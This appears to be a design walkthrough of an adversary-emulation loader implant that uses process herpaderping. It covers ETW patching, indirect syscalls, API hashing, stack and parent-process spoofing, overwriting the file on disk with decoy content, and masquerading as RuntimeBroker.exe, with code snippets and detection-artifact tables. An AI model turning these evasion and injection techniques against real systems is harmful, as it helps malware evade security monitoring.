# CWLHerpaderping - Code Flow Summary

This document summarizes the code flow of `CWLHerpaderping`, focusing on how the loader reads a PE payload, creates a ghost process via the **classic 3-syscall herpaderping path** (`NtCreateSection` → `NtCreateProcessEx` → `NtCreateThreadEx`), overwrites the on-disk backing file before the thread runs, and manually injects spoofed process parameters into the remote process via `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` so the ghost appears as `RuntimeBroker.exe`.

## Source Map

| Component | Path | Role |
|---|---|---|
| Main implant | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp` | Entry point, ETW patch, payload read/delete, herpaderping flow |
| Native declarations | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/CWLInc.h` | NT types, PEB structures, function typedefs |
| API hashing | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/api_hash.h` | DJB2 hash constants, PEB-walk module finder, EAT-walk resolver |
| Indirect syscall helpers | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/syscall.h` | Halo's Gate SSN resolution, `syscall;ret` gadget finder, runtime stub builder |
| Stack spoofing | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/StackSpoof.cpp` | Fake return address planted inside `kernel32.dll` before `NtCreateProcessEx` syscall |
| Obfuscated strings | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/obfstr.h` | Compile-time XOR string obfuscation |

---

## API and DLL Map

### ntdll.dll — Indirect Syscall (Halo's Gate + in-ntdll gadget)

`syscall.h` builds 21-byte runtime stubs for the 5 injection-critical NT APIs. Each stub: `mov r10,rcx; mov eax,<SSN>; movabs r11,<gadget>; jmp r11`. The `syscall;ret` gadget (`0F 05 C3`) is located inside ntdll `.text` by scanning PE section bytes — so the kernel sees the syscall as originating from ntdll, bypassing EDR user-mode hooks. SSN is read from the stub's `mov eax` at offset +4; if the stub is hooked (first bytes overwritten), Halo's Gate infers SSN from clean neighbors in the EAT (±16 entries, SSNs are sequential by EAT order).

| API | SSN Source | Purpose | Stage |
|---|---|---|---|
| `NtCreateSection` | Halo's Gate on ntdll EAT | Snapshot payload temp file as `SEC_IMAGE` section | 6 |
| `NtCreateProcessEx` | Halo's Gate on ntdll EAT | Create ghost process from section; PPID via `ParentProcess` handle | 6 |
| `NtAllocateVirtualMemory` | Halo's Gate on ntdll EAT | Allocate remote memory at 64KB-aligned VA matching local params | 9 |
| `NtWriteVirtualMemory` (×2) | Halo's Gate on ntdll EAT | Copy process parameters blob; patch `PEB->ProcessParameters` pointer | 9 |
| `NtCreateThreadEx` | Halo's Gate on ntdll EAT | Create primary thread at payload entry point | 10 |

Stub pool lifecycle:
- `InitSyscallPool(hNtdll)` → `VirtualAlloc(PAGE_READWRITE)` allocates pool (8 slots × 21 bytes)
- `BuildIndirectStub(ssn)` × 5 writes stubs into pool
- `SealSyscallPool()` → `VirtualProtect(PAGE_EXECUTE_READ)` eliminates RWX window

### ntdll.dll — RESOLVE_API (DJB2 EAT walk, no IAT entry)

`api_hash.h::GetProcByHash()` walks the ntdll EAT, hashes each export name with DJB2, and compares against a pre-computed constant. No `GetProcAddress("ApiName")` — no plaintext API name strings at call sites or in binary.

`GetNtdllBase()` finds ntdll by walking `PEB->LoaderData->InMemoryOrderModuleList` — no `GetModuleHandle` needed.

| API | DJB2 Hash | Resolution Path | Purpose | Stage |
|---|---|---|---|---|
| `EtwEventWrite` | `0x24A8D022` | `RESOLVE_API` → pointer → patch in-place | `VirtualProtect` + `memcpy(\x33\xC0\xC3)` — ETW suppression | 2 |
| `NtQueryInformationProcess` | `0xD034FC62` | `RESOLVE_API` → direct call | Read ghost `PEB` base address | 8 |
| `RtlImageNtHeader` | `0xC63A2FA5` | `RESOLVE_API` → direct call | Parse local payload PE headers for `AddressOfEntryPoint` | 8 |
| `NtReadVirtualMemory` | `0xC24062E3` | `RESOLVE_API` → direct call | Read ghost PEB to get `ImageBaseAddress` | 8 |
| `RtlCreateProcessParametersEx` | `0x19132CBB` | `RESOLVE_API` → direct call | Build spoofed `RTL_USER_PROCESS_PARAMETERS` (normalized) | 9 |
| `RtlInitUnicodeString` | `0x29B75F89` | `RESOLVE_API` → direct call (×2) | Initialize `UNICODE_STRING` for `ImagePathName` / `DllPath` | 9 |

### kernel32.dll / kernelbase.dll — Standard Win32 (PE IAT)

Resolved by the Windows loader at process startup. Names appear in the PE import table. Listed in approximate call order across all stages.

| API | Module | Purpose | Stage |
|---|---|---|---|
| `VirtualProtect` | kernelbase | Change ntdll page protection for ETW patch | 2 |
| `GetStdHandle(STD_INPUT_HANDLE)` | kernel32 | Get stdin handle | 3 |
| `GetFileType` | kernel32 | Detect `FILE_TYPE_PIPE` → Mode 1 trigger | 3 |
| `VirtualAlloc` | kernelbase | Allocate payload heap buffer | 3 |
| `CreateFileW` (PAYLOAD_PATH) | kernel32 | Open payload file (Mode 2) | 3 |
| `GetFileSize` | kernel32 | Get payload file size (Mode 2) | 3 |
| `ReadFile` (stdin / file) | kernel32 | Read payload bytes | 3 |
| `CloseHandle` (payload file) | kernel32 | Close payload file handle | 3 |
| `DeleteFileW` (PAYLOAD_PATH) | kernel32 | Delete payload file after read (Mode 2, T1070.004) | 3 |
| `VirtualAlloc` (stub pool) | kernelbase | Allocate indirect syscall stub pool (RW) | 4 |
| `VirtualProtect` (stub pool) | kernelbase | Seal stub pool `RW → RX` (`SealSyscallPool`) | 4 |
| `GetTempPathW` | kernel32 | Resolve `%TEMP%` directory | 5 |
| `GetTempFileNameW` | kernel32 | Create `HD*.tmp` backing file path | 5 |
| `CreateFileW` (hTemp) | kernel32 | Open temp file: `GENERIC_READ\|WRITE\|SYNC`, `FILE_SHARE_READ`, `FILE_ATTRIBUTE_HIDDEN`; attribute set at creation before any write or section lock; hold open through `NtCreateSection` | 5 |
| `WriteFile` (payload → hTemp) | kernel32 | Write full payload bytes to temp file | 5 |
| `FlushFileBuffers` (hTemp) | kernel32 | Flush temp file before `NtCreateSection` | 5 |
| `CreateToolhelp32Snapshot` | kernel32 | Take process snapshot for PPID candidate search | 6 |
| `Process32FirstW` / `Process32NextW` | kernel32 | Walk process snapshot entries | 6 |
| `ProcessIdToSessionId` | kernel32 | Filter Session 0 candidates | 6 |
| `OpenProcess(PROCESS_CREATE_PROCESS)` | kernel32 | Acquire spoofed-parent handle (`svchost` / `wininit`) | 6 |
| `CloseHandle` (hSnap) | kernel32 | Release process snapshot | 6 |
| `GetModuleHandleA("kernel32.dll")` | kernel32 | Find kernel32 base for StackSpoof gadget scan | 6 |
| `GetModuleInformation` | psapi / kernel32 | Get kernel32 `SizeOfImage` for full-image byte scan | 6 |
| `VirtualQuery` | kernel32 | Verify page is `PAGE_EXECUTE_READ[WRITE]` (fallback gadget path) | 6 |
| `CloseHandle` (hParent) | kernel32 | Release parent handle after `NtCreateProcessEx` | 6 |
| `SetFilePointer` (hTemp, 0) | kernel32 | Rewind temp file to start for decoy overwrite | 7 |
| `WriteFile` (decoy × N) | kernel32 | Write IIS W3SVC log lines in-place | 7 |
| `FlushFileBuffers` (hTemp) | kernel32 | Flush decoy content before close | 7 |
| `CloseHandle` (hTemp) | kernel32 | Release temp file handle; on-disk content is now pure decoy | 7 |
| `CloseHandle` (hSection) | kernel32 | Release section handle after thread launch | 10 |

### CRT — Inline / Statically Linked

| Function | Purpose |
|---|---|
| `strlen` | Measure decoy line length in overwrite loop |
| `memcpy` | ETW patch; stub byte construction |
| `memcmp` | StackSpoof gadget pattern scan (`EPILOGUE_PATTERN`, `RET_PATTERN`) |
| `_AddressOfReturnAddress` | Compiler intrinsic — locate return-address slot on stack (StackSpoof) |
| `wcscpy` / `lstrcpyW` | Build target path strings |

---

## High-Level Runtime Flow

```text
wmain()
  -> [#ifdef ENABLE_ETW_PATCH] PatchEtw()         <- T1562.006 (conditional)
  -> GetPayloadBuffer()
       -> GetFileType(STD_INPUT_HANDLE)
       -> MODE 1 (stdin pipe - T1620 Reflective Code Loading):
            -> ReadFile(stdin, 4-byte LE size header)
            -> VirtualAlloc(PAGE_READWRITE, size)
            -> ReadFile(stdin, payload bytes)
            -> NO DISK FILE (reflective path)
       -> MODE 2 (file fallback - T1070.004 File Deletion):
            -> CreateFileW(PAYLOAD_PATH)
            -> ReadFile(payload bytes)
            -> CloseHandle; DeleteFileW(PAYLOAD_PATH)    <- payload deleted before decode
            -> [#ifdef ENABLE_PAYLOAD_XOR] XOR decode in-place  <- T1027.013
  -> Herpaderping(payloadBuffer, payloadSize)
       -> InitSyscallPool(hNtdll)                        <- VirtualAlloc stub pool (RW)
       -> INDIRECT_SYSCALL(NtCreateSection)   x1
       -> INDIRECT_SYSCALL(NtCreateProcessEx) x1
       -> INDIRECT_SYSCALL(NtAllocateVirtualMemory) x1
       -> INDIRECT_SYSCALL(NtWriteVirtualMemory) x1
       -> INDIRECT_SYSCALL(NtCreateThreadEx)  x1
       -> SealSyscallPool()                              <- stub pool RW -> RX
       -> GetTempFileNameW (prefix "HD") -> hTemp (SHARE_READ, FILE_ATTRIBUTE_HIDDEN, handle kept open)
       -> WriteFile(payload -> hTemp) + FlushFileBuffers  <- hTemp stays OPEN (SHARE_READ)
       -> NtCreateSection(SEC_IMAGE, hTemp)              <- snapshot payload as image section
            <- kernel runs MmFlushImageSection: blocks NEW writers, pre-held hTemp survives
       -> GetNonJobParent()                              <- PPID spoof: svchost/wininit Session 0
            -> CreateToolhelp32Snapshot + Process32First/Next
            -> ProcessIdToSessionId (filter Session 0)
            -> OpenProcess(PROCESS_CREATE_PROCESS)
       -> [StackSpoof: Activate]
            -> GetModuleHandleA + GetModuleInformation  <- find kernel32 for gadget
            -> scan for "add rsp,0x28; ret" (EPILOGUE_PATTERN) / fallback "ret" + VirtualQuery
            -> _AddressOfReturnAddress -> plant fake return in kernel32
       -> NtCreateProcessEx(hSection, hParent, Flags=0, InJob=FALSE)  <- indirect syscall
            <- ghost process created; NO primary thread (natural writable window)
       -> [StackSpoof: Deactivate] + CloseHandle(hParent)
       -> SetFilePointer(hTemp, 0) + WriteFile loop (IIS log lines) until totalWritten >= payloadSize
            <- in-place overwrite via pre-held hTemp; active section blocks SetEndOfFile resize
       -> FlushFileBuffers(hTemp) + CloseHandle(hTemp)
            <- on-disk file is now 100% IIS W3SVC log content; file stays on disk
       -> NtQueryInformationProcess(ProcessBasicInformation) -> pbi  <- RESOLVE_API, direct call
       -> GetEntryPoint(hProcess, payload, pbi)
            -> RESOLVE_API(RtlImageNtHeader): parse local payload -> AddressOfEntryPoint
            -> RESOLVE_API(NtReadVirtualMemory): read ghost PEB -> ImageBaseAddress
            -> entryPoint = ImageBaseAddress + AddressOfEntryPoint
       -> RtlInitUnicodeString(x2: ImagePathName, DllPath)            <- RESOLVE_API
       -> RtlCreateProcessParametersEx(RuntimeBroker.exe, NORMALIZED) <- RESOLVE_API
            <- all UNICODE_STRING.pBuffer fields become absolute local VAs
       -> 64KB alignment: hintBase = (ULONG_PTR)processParameters & ~0xFFFF
       -> NtAllocateVirtualMemory(hProcess, hint=hintBase, allocSize) <- indirect syscall
            <- remote allocation lands at same VA as local processParameters
       -> NtWriteVirtualMemory(hProcess, processParameters, paramSize)  <- indirect syscall
       -> NtWriteVirtualMemory(hProcess, &PEB->ProcessParameters, &ptr) <- indirect syscall
       -> NtCreateThreadEx(hProcess, entryPoint)        <- indirect syscall; ghost begins executing
       -> CloseHandle(hSection)
            <- temp file stays on disk (active section blocks unlink: STATUS_CANNOT_DELETE 0xC0000121)
```

> **Core point:** The payload enters the ghost process image when `NtCreateSection(SEC_IMAGE)` snapshots the temp file and `NtCreateProcessEx` maps that section into a new address space — no `WriteProcessMemory`. `NtCreateProcessEx` does NOT create a primary thread; this is the natural writable window. Process parameters are injected manually via `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` at the same VA as the local `processParameters` block (64KB-aligned hint), so all absolute `UNICODE_STRING.pBuffer` pointers resolve correctly in the remote process.

---

## Entry Point

`wmain()` in `CWLImplant.cpp`:

```text
[#ifdef ENABLE_ETW_PATCH] PatchEtw()
GetPayloadBuffer(payloadSize)
Herpaderping(payloadBuffer, payloadSize)
```

### Default Payload Path (Mode 2 only)

```text
C:\ProgramData\CertCA.bin
```

Overridden at build time via `/p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin"` (used in emulation plan). Only used when stdin is not a pipe.

### Stdin Redirection (Mode 1)

When the binary is spawned with stdin pipe redirection (e.g., via Node.js `spawnSync` with `input` option), `GetFileType(STD_INPUT_HANDLE) == FILE_TYPE_PIPE` routes to reflective mode. `PAYLOAD_PATH` is never opened.

Payload format: 4-byte little-endian size header followed by raw PE bytes. Sanity check: 1 KB – 50 MB range.

---

## Stage 1 — Static Evasion Helpers (Compile-Time)

Two compile-time helpers reduce static signatures before any runtime behavior:

**1. `obfstr.h` — String Obfuscation**

`OBFSTR()` / `OBFWSTR()` XOR-obfuscate sensitive string literals at compile time using a position-dependent key: `key(i) = (0xA3 + i × 0x5B) & 0xFF` — single-byte XOR brute-force (FLOSS) cannot recover the plaintext. Each string decrypts to a `thread_local` stack buffer at use-site. The following strings are not present as plaintext in the binary:

| String | Used by |
|---|---|
| `svchost.exe` | `GetNonJobParent()` |
| `wininit.exe` | `GetNonJobParent()` |
| `kernel32.dll` | `StackSpoofer` constructor |
| `C:\Windows\System32\RuntimeBroker.exe` | `RtlCreateProcessParametersEx` |
| `C:\Windows\System32` | `RtlCreateProcessParametersEx` (DllPath) |

In Release builds, `perror` is suppressed via macro (`#ifndef CWLDEBUG` → `#define perror(x) ((void)0)`): all `perror` string arguments (`"[-] Failed to initialize indirect syscall pool"`, etc.) are unreferenced and omitted from `.rdata`. Debug builds (`/p:CWLDebug=1`) retain `perror` output.

**2. `api_hash.h` — API Hash Resolution**

`RESOLVE_API(hNtdll, ApiName)` resolves ntdll exports without plaintext names at call sites. `GetNtdllBase()` walks `PEB->LoaderData->InMemoryOrderModuleList` — no `GetModuleHandle`. Then `GetProcByHash()` iterates the ntdll EAT and compares DJB2 hashes.

APIs resolved via `RESOLVE_API` (no IAT entry):

| API | Hash | Used in |
|---|---|---|
| `EtwEventWrite` | `0x24A8D022` | `PatchEtw()` |
| `NtQueryInformationProcess` | `0xD034FC62` | `Herpaderping()` — PEB query |
| `RtlImageNtHeader` | `0xC63A2FA5` | `GetEntryPoint()` |
| `NtReadVirtualMemory` | `0xC24062E3` | `GetEntryPoint()` |
| `RtlCreateProcessParametersEx` | `0x19132CBB` | `Herpaderping()` |
| `RtlInitUnicodeString` | `0x29B75F89` | `Herpaderping()` |

The 5 injection-critical APIs (`NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) use a separate path: `InitSyscallPool` + `INDIRECT_SYSCALL` (Stage 4), not `RESOLVE_API`.

---

## Stage 2 — ETW Patch (Conditional)

`PatchEtw()` is only compiled and called when built with `ENABLE_ETW_PATCH` (`/p:ETWPatch=1`). Without that flag the function does not exist.

When active:

1. `GetNtdllBase()` — PEB walk → ntdll base
2. `RESOLVE_API(hNtdll, EtwEventWrite)` → `pEtw`
3. `VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old)` — kernelbase
4. `memcpy(pEtw, "\x33\xC0\xC3", 3)` — CRT (`xor eax,eax; ret`)
5. `VirtualProtect(pEtw, 4, old, &old)` — kernelbase; restores original protection

This suppresses DC0021 (OS API Execution) ETW telemetry for all subsequent NT API calls in this process.

| Artifact | Meaning |
|---|---|
| Modified bytes at `ntdll!EtwEventWrite` | ETW suppression active in loader process |
| `VirtualProtect` on ntdll code region | Preparation for in-memory patch |

---

## Stage 3 — Payload Acquisition (Dual Mode)

`GetPayloadBuffer()` selects mode at runtime based on stdin type.

### Mode 1: Reflective Loading via Stdin (T1620)

**Trigger:** `GetFileType(GetStdHandle(STD_INPUT_HANDLE)) == FILE_TYPE_PIPE`

1. `ReadFile(hStdin, &payloadSize, sizeof(DWORD), ...)` — read 4-byte LE size header
2. `VirtualAlloc(0, payloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)` — allocate buffer
3. `ReadFile(hStdin, bufferAddress, payloadSize, ...)` — read PE bytes
4. Return buffer; payload never touches disk (T1620)

### Mode 2: File-based Loading with Deletion (T1070.004)

**Trigger:** stdin is not a pipe

1. `CreateFileW(PAYLOAD_PATH, GENERIC_READ, 0, ...)` — open payload
2. `GetFileSize` → `VirtualAlloc` → `ReadFile` — read into buffer
3. `CloseHandle` + `DeleteFileW(PAYLOAD_PATH)` — T1070.004; deleted before decode
4. `[#ifdef ENABLE_PAYLOAD_XOR]` XOR decode in-place: `decoded[i] = buf[i] ^ ((0xA3 + i * 0x5B) & 0xFF)` — T1027.013

XOR detail: position-dependent, self-inverse. First byte: `0x4D ('M') ^ 0xA3 = 0xEE` — on-disk file never starts with `MZ`.

---

## Stage 4 — Indirect Syscall Setup

`InitSyscallPool(hNtdll)` initializes the stub infrastructure using **ntdll alone** — no external API calls except `VirtualAlloc` / `VirtualProtect` (kernelbase):

**Gadget finder (`FindSyscallGadget`):**
Scans ntdll PE section headers for the `.text` section, then linearly searches for `0F 05 C3` (`syscall; ret`). This address becomes the jump target for all 5 stubs — syscalls appear to originate from ntdll.

**SSN resolver (`GetSsnHalosGate`):**
Reads `mov eax, <SSN>` at byte offset +4 of each ntdll stub. If the stub prologue is hooked (bytes overwritten by EDR), walks neighboring EAT entries (±16) to infer SSN by index delta — Halo's Gate. ntdll syscall stubs are allocated sequentially by SSN, so `stub[i].SSN = stub[i+N].SSN - N`.

**Stub builder (`BuildIndirectStub`):**
Writes a 21-byte stub into the pool: `mov r10,rcx` (Windows ABI) → `mov eax,<SSN>` → `movabs r11,<gadget>` → `jmp r11`.

**SealSyscallPool:**
`VirtualProtect(pool, SYSCALL_STUB_SIZE * SYSCALL_MAX_STUBS, PAGE_EXECUTE_READ, ...)` — eliminates the RWX window after all stubs are written.

5 stubs built (in order):

| Stub | API | SSN Source |
|---|---|---|
| 1 | `NtCreateSection` | Halo's Gate |
| 2 | `NtCreateProcessEx` | Halo's Gate |
| 3 | `NtAllocateVirtualMemory` | Halo's Gate |
| 4 | `NtWriteVirtualMemory` | Halo's Gate |
| 5 | `NtCreateThreadEx` | Halo's Gate |

| Artifact | Meaning |
|---|---|
| `VirtualAlloc(PAGE_READWRITE)` for small anonymous region (~168 bytes) | Syscall stub pool allocation |
| `VirtualProtect` on that region → `PAGE_EXECUTE_READ` | Pool sealed; no persistent RWX page |
| Stub bytes at allocated address | `49 89 CA B8 XX XX XX XX 49 BB XX..XX 41 FF E3` — indirect syscall pattern |

---

## Stage 5 — Temp File Staging

The herpaderping trick requires a legitimate PE on disk **before** section creation, and a pre-held write-capable handle to survive `MmFlushImageSection`.

1. `GetTempPathW(MAX_PATH, tempPath)` — resolve `%TEMP%`
2. `GetTempFileNameW(tempPath, L"HD", 0, tempFile)` — create `HD*.tmp` path
3. `CreateFileW(tempFile, GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0)` — `FILE_ATTRIBUTE_HIDDEN` set at creation time (before any `WriteFile` or `NtCreateSection`); hold handle open; `FILE_SHARE_READ` only (no `FILE_SHARE_DELETE`)
4. `WriteFile(hTemp, payload, payloadSize, ...)` — write full PE payload
5. `FlushFileBuffers(hTemp)` — guarantee sector commit before `NtCreateSection`

**Handle kept open:** `hTemp` is NOT closed here. `MmFlushImageSection` (called by the kernel when `NtCreateSection(SEC_IMAGE)` is invoked) blocks **new** writers on the file, but existing handles with write access are grandfathered — this is what makes the herpaderping overwrite possible in Stage 7.

| Artifact | Meaning |
|---|---|
| `%TEMP%\HD*.tmp` created with `FILE_ATTRIBUTE_HIDDEN` and valid PE header | Ghost process backing file; hidden from Explorer and basic `dir` output; MFT enumeration (`dir /ah`, `Get-ChildItem -Hidden`, Sysmon EID 11) required to observe |
| `FlushFileBuffers` on temp file | Guarantees sector commit before image section creation |
| Handle held open after write (no `CloseHandle`) | Pre-held write access for Stage 7 overwrite |

---

## Stage 6 — Section Creation and Ghost Process

### 6a — NtCreateSection

```cpp
pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0,
                 PAGE_READONLY, SEC_IMAGE, hTemp);  // indirect syscall
```

`SEC_IMAGE` tells the kernel to treat the file as a PE image. The kernel runs `MmFlushImageSection`, which marks the file as image-mapped — new `CreateFile` attempts without `FILE_SHARE_READ` would fail, but `hTemp` (already open) retains its write permission.

### 6b — PPID Candidate Selection

`GetNonJobParent()` enumerates processes and selects a Session 0 target:

```
CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)
  -> Process32FirstW / Process32NextW
       -> _wcsicmp(name, "svchost.exe")  [OBFWSTR]
       -> ProcessIdToSessionId(pid) == 0  <- reject interactive sessions
       -> OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid) -> hParent
```

Priority: `svchost.exe` (non-PPL, always Session 0, reliably accessible on Server 2022) → fallback `wininit.exe` → fallback `GetCurrentProcess()`.

### 6c — StackSpoof Setup

`StackSpoofer spoofer(OBFSTR("kernel32.dll"))` — constructor runs immediately:

1. `_AddressOfReturnAddress()` — compiler intrinsic; captures return-address slot on current stack frame
2. `GetModuleHandleA("kernel32.dll")` — get kernel32 base
3. `GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, ...)` — get `SizeOfImage`
4. Scan full image for `\x48\x83\xC4\x28\xC3` (`add rsp,0x28; ret` — function epilogue pattern)
5. Fallback: scan for `\xC3` (`ret`) + `VirtualQuery` to verify `PAGE_EXECUTE_READ[WRITE]`
6. Store `fakeReturnAddress` = gadget VA inside kernel32

### 6d — NtCreateProcessEx

```
spoofer.Activate()           <- overwrite return-address slot with kernel32 gadget
pNtCreateProcessEx(
    &hProcess,               -> ghost EPROCESS created
    PROCESS_ALL_ACCESS,
    NULL,                    <- no ObjectAttributes (anonymous)
    hParent,                 <- PPID spoof: svchost/wininit Session 0
    0,                       <- Flags=0: no PS_INHERIT_HANDLES
    hSection,                <- image section from temp file
    NULL, NULL,              <- DebugPort, ExceptionPort
    FALSE                    <- InJob=FALSE: do not join parent job object
)                            -> indirect syscall; EDR stack walk sees kernel32 origin
spoofer.Deactivate()         <- restore original return address
CloseHandle(hParent)
```

**No primary thread is created.** This is the key difference from `NtCreateUserProcess` (which is atomic). The ghost EPROCESS exists with its image mapped but no thread — the natural writable window between Stages 6 and 10.

**Token:** `NtCreateProcessEx` inherits the spoofed parent's (`svchost.exe`) token. Since both the caller and `svchost.exe` run as SYSTEM (via EfsPotato), no `NtSetInformationProcess(ProcessAccessToken)` fixup is needed.

| Artifact | Meaning |
|---|---|
| `NtCreateSection(SEC_IMAGE)` on `HD*.tmp` | Image section creation; file locked against new writers |
| `CreateToolhelp32Snapshot` + `Process32First/Next` | Process enumeration before spawning |
| `OpenProcess(PROCESS_CREATE_PROCESS)` on `svchost.exe` / `wininit.exe` | PPID spoof handle acquired |
| `GetModuleHandleA` + `GetModuleInformation` + byte scan on kernel32 | StackSpoof gadget search |
| `NtCreateProcessEx` with `SectionHandle` = `HD*.tmp` section | Ghost process mapped from temp file |
| Child PPID = `svchost.exe` / `wininit.exe` | PPID does not reflect real caller |
| Stack return address in `kernel32.dll` during syscall | StackSpoof active; call origin hidden |

---

## Stage 7 — File Herpaderping (In-Place Overwrite)

After the ghost process exists but before any thread runs, the original payload bytes on disk are replaced with IIS W3SVC log content using the **pre-held `hTemp`** — no reopen needed.

```cpp
SetFilePointer(hTemp, 0, NULL, FILE_BEGIN);
SIZE_T totalWritten = 0;
int idx = 0;
while (totalWritten < payloadSize) {
    const char* line = decoyLines[idx % decoyCount];
    DWORD len = (DWORD)strlen(line);
    if (totalWritten + len > payloadSize) len = (DWORD)(payloadSize - totalWritten);
    DWORD wrote = 0;
    if (!WriteFile(hTemp, line, len, &wrote, NULL) || wrote == 0) break;
    totalWritten += wrote;
    idx++;
}
FlushFileBuffers(hTemp);
CloseHandle(hTemp);
```

**Why no truncate:** `SetEndOfFile` silently fails while an active `SEC_IMAGE` section is mapped — the kernel blocks resize operations on image-backed files. The loop therefore writes in-place until `totalWritten >= payloadSize`, covering every byte of the original payload. File size on disk does not change (= payloadSize), but all content is replaced.

**Decoy content:** 10 rotating IIS W3SVC log lines (date `2026-05-28`, IPs `10.0.0.5`/`10.0.0.1`, paths `/api/health`, `/api/upload/*`, `/portal/assets/*`). The resulting file looks like a normal IIS log from the emulation environment.

**File stays on disk:** After `CloseHandle(hTemp)`, the temp file is not deleted. `DeleteFileW` / `NtSetInformationFile(FileDispositionInformation)` return `STATUS_CANNOT_DELETE (0xC0000121)` because the active `SEC_IMAGE` section pins the file. The full in-place overwrite makes the residual file innocuous.

| Artifact | Meaning |
|---|---|
| `SetFilePointer` + `WriteFile` loop on `HD*.tmp` after `NtCreateProcessEx` | Herpaderping overwrite in progress |
| `HD*.tmp` content = IIS log (not PE) after overwrite | On-disk file no longer matches in-memory image |
| `HD*.tmp` persists on disk | `STATUS_CANNOT_DELETE` — active SEC_IMAGE section holds file pinned |

---

## Stage 8 — Entry Point Resolution

```cpp
// 1) Query ghost process PEB base
pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
//    RESOLVE_API call (no syscall stub); returns pbi.PebBaseAddress

// 2) Read remote PEB to get ImageBaseAddress
pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image[0x1000], &bytesRead, NULL);
//    RESOLVE_API call; image[] = first 0x1000 bytes of ghost PEB page
ULONG_PTR imageBase = ((PPEB)image)->ImageBaseAddress;

// 3) Parse local payload PE headers for entry point RVA
ULONG_PTR rva = pRtlImageNtHeader(payload)->OptionalHeader.AddressOfEntryPoint;
//    RESOLVE_API call on local payload buffer

// 4) Compute absolute entry point VA
entryPoint = imageBase + rva;
```

`NtQueryInformationProcess` and `NtReadVirtualMemory` are resolved via `RESOLVE_API` (DJB2 EAT walk) — they are **not** indirect syscall stubs. `RtlImageNtHeader` operates on the **local** payload buffer (no cross-process call).

| Artifact | Meaning |
|---|---|
| `NtQueryInformationProcess(ProcessBasicInformation)` on ghost process | PEB base address query |
| `NtReadVirtualMemory` reading ghost PEB | `ImageBaseAddress` extracted from remote process |

---

## Stage 9 — PEB Parameter Injection

Process parameters must be injected manually because `NtCreateProcessEx` does not accept a `processParameters` argument (unlike `NtCreateUserProcess`).

### 9a — Build Parameters Locally

```cpp
pRtlInitUnicodeString(&uTargetFilePath, L"C:\\Windows\\System32\\RuntimeBroker.exe");
pRtlInitUnicodeString(&uDllPath, L"C:\\Windows\\System32");
pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
                               NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL,
                               RTL_USER_PROC_PARAMS_NORMALIZED);
```

`RTL_USER_PROC_PARAMS_NORMALIZED` flag: all `UNICODE_STRING.pBuffer` fields inside the block become absolute virtual addresses pointing into the local process address space. These pointers must resolve identically in the remote process.

### 9b — 64KB-Aligned Remote Allocation

```cpp
const SIZE_T ALLOC_GRANULE = 0x10000;
SIZE_T paramSize  = processParameters->EnvironmentSize + processParameters->MaximumLength;
ULONG_PTR hintBase  = (ULONG_PTR)processParameters & ~(ALLOC_GRANULE - 1);
ULONG_PTR hintEnd   = (ULONG_PTR)processParameters + paramSize;
SIZE_T    allocSize = (hintEnd - hintBase + ALLOC_GRANULE - 1) & ~(ALLOC_GRANULE - 1);
PVOID paramBuffer   = (PVOID)hintBase;
pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &allocSize,
                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

`NtAllocateVirtualMemory` rounds the `BaseAddress` hint **down** to 64KB granularity. Pre-aligning the hint ensures the remote allocation lands at exactly `hintBase`. `allocSize` is inflated to cover from `hintBase` to `processParameters + paramSize` (rounded up to 64KB). This guarantees the local `processParameters` VA falls inside the remote allocation — a condition required for `NtWriteVirtualMemory` to succeed.

### 9c — Write Params and Patch PEB

```cpp
// Copy the full params blob at the matching remote VA
pNtWriteVirtualMemory(hProcess, processParameters, processParameters, paramSize, NULL);

// Patch PEB->ProcessParameters pointer
PEB* remotePEB = (PEB*)pbi.PebBaseAddress;
PVOID paramsPtr = processParameters;
pNtWriteVirtualMemory(hProcess, &remotePEB->ProcessParameters,
                       &paramsPtr, sizeof(PVOID), NULL);
```

Both calls use the indirect syscall stub. The remote process now has a valid `PEB->ProcessParameters` block with `ImagePathName = RuntimeBroker.exe`.

| Artifact | Meaning |
|---|---|
| `NtAllocateVirtualMemory` in ghost process at specific hint VA | Remote memory preparation for params |
| `NtWriteVirtualMemory` × 2 into ghost process | Params blob write + PEB pointer patch |
| `ProcessParameters.ImagePathName` = `RuntimeBroker.exe` in ghost | Masquerade spoofed at PEB level |

---

## Stage 10 — Thread Launch and Cleanup

```cpp
pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                  (LPTHREAD_START_ROUTINE)entryPoint, NULL,
                  FALSE, 0, 0, 0, 0);  // indirect syscall; CreateSuspended=FALSE
CloseHandle(hSection);
// No file deletion — temp file stays on disk (STATUS_CANNOT_DELETE)
```

`NtCreateThreadEx` creates the primary thread directly at `entryPoint` with `CreateSuspended=FALSE` — no separate resume step. Unlike the atomic `NtCreateUserProcess`, this is a **separate externally-visible cross-process thread creation event** (Sysmon EventCode=8 equivalent for NT path).

After `CloseHandle(hSection)`, the child process retains its own image section mapping independently — the section object remains alive as long as the child's VAD references it.

| Artifact | Meaning |
|---|---|
